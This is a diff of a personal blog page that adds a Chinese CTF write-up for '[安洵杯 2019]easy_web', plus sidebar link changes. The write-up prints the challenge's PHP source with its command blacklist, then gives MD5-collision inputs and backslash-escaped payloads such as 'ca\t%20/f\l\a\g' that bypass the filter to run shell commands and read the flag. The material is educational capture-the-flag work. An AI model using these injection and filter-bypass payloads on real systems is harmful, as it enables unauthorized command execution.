@@ -69,6 +69,66 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-安洵杯-2019-easy-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/" class="article-date">
+  <time class="dt-published" datetime="2025-01-26T12:32:20.000Z" itemprop="datePublished">2025-01-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/">[安洵杯 2019]easy_web</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先打开靶机，发现是一段吐槽（web狗如何在险恶的ctf世界中存活?),图片的信息不多，便发现在url中有&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;<br>发现img等于的好像是base64编码，解码后发现好像还是base64编码，再解码得3535352e706e67，这一串好像是16进制，解码得555.png。由此便可知道要将index.php先进行16进制的编码再进行两次base64编码，便得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br>在url中传参得，看到变化不大，便查看源代码，data:image&#x2F;gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4&#x3D;’<br>对其进行解码得<br>&lt;?php<br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(‘content-type:text&#x2F;html;charset&#x3D;utf-8’);<br>$cmd &#x3D; $_GET[‘cmd’];<br>if (!isset($_GET[‘img’]) || !isset($_GET[‘cmd’]))<br>    header(‘Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;’);<br>$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[‘img’])));</p>
+<p>$file &#x3D; preg_replace(“&#x2F;[^a-zA-Z0-9.]+&#x2F;“, “”, $file);<br>if (preg_match(“&#x2F;flag&#x2F;i”, $file)) {<br>    echo ‘<img src ="./ctf3.jpeg">‘;<br>    die(“xixi～ no flag”);<br>} else {<br>    $txt &#x3D; base64_encode(file_get_contents($file));<br>    echo “<img src='data:image/gif;base64," . $txt . "'></img>“;<br>    echo “<br>“;<br>}<br>echo $cmd;<br>echo “<br>“;<br>if (preg_match(“&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|’|”|<code>|;|,|*|?|\|\\|n|t|r|xA0|&#123;|&#125;|(|)|&amp;[^d]|@|||\$|[|]|&#123;|&#125;|(|)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;     echo(&quot;forbid ~&quot;);     echo &quot;&lt;br&gt;&quot;; &#125; else &#123;     if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;         echo </code>$cmd&#96;;<br>    } else {<br>        echo (“md5 is funny ~”);<br>    }<br>}</p>
+<p>?&gt;</p>
+<html>
+<style>
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+</style>
+<body>
+</body>
+</html>
+
+<p>进行代码审计if (preg_match(“&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|’|”|<code>|;|,|*|?|\|\\|n|t|r|xA0|&#123;|&#125;|(|)|&amp;[^d]|@|||\$|[|]|&#123;|&#125;|(|)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;          echo(&quot;forbid ~&quot;);     echo &quot;&lt;br&gt;&quot;; &#125; else &#123;     if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;    //a和b的内容不一样但是需要md5值一样         echo </code>$cmd&#96;;          &#x2F;&#x2F;将cmd当成系统命令执行并输出<br>    } else {<br>        echo (“md5 is funny ~”);<br>    }<br>}</p>
+<p>发现是MD5的强比较看到有（string），要有$a &#x3D; %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;$b &#x3D; %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2进行绕过，<br>过滤了ls，使用dir</p>
+<p>这里抓包放进去</p>
+<p>然后在url的cmd传参处传入dir</p>
+<p>目录下面没有flag，查看根目录，空格用%20代替</p>
+<p>payload：l\s%20&#x2F;<br>看到flag，然后输入cat flag&#x3D;&gt;ca\t%20&#x2F;f\l\a\g便得到flag。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/" data-id="cm6dmo6db00003ox1dm5i7aa3" data-title="[安洵杯 2019]easy_web" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-极客大挑战-2019-Havefun" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/" class="article-date">
@@ -474,6 +534,10 @@ static class MyObject implements Serializable &#123;
       <ul>
         
           <li>
+            <a href="/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/">[安洵杯 2019]easy_web</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/">[极客大挑战 2019]Havefun</a>
           </li>
         
@@ -487,10 +551,6 @@ static class MyObject implements Serializable &#123;
         
           <li>
             <a href="/2025/01/19/%E9%A2%981/">题1</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">web 反序列化</a>
           </li>
         
       </ul>
